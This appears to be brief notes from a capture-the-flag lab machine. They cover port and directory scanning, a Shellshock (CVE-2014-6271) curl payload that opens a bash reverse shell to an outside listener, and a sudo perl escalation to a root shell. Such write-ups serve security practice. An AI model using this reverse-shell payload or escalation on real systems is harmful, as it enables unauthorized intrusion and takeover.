sudo nmap -sV -sC -O -v -Pn $IP

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)

sudo gobuster dir -u http://10.129.234.65/ -w /usr/share/wordlists/dirb/common.txt -t 30

cgi-bin 

sudo gobuster dir -u http://10.129.234.65/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x .py,.php,.sh 

user.sh

shell shock
https://github.com/opsxcq/exploit-CVE-2014-6271

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.173/4444 0>&1'" \
http://10.129.234.65/cgi-bin/user.sh

nopass perl

sudo perl -e 'exec "/bin/sh";'
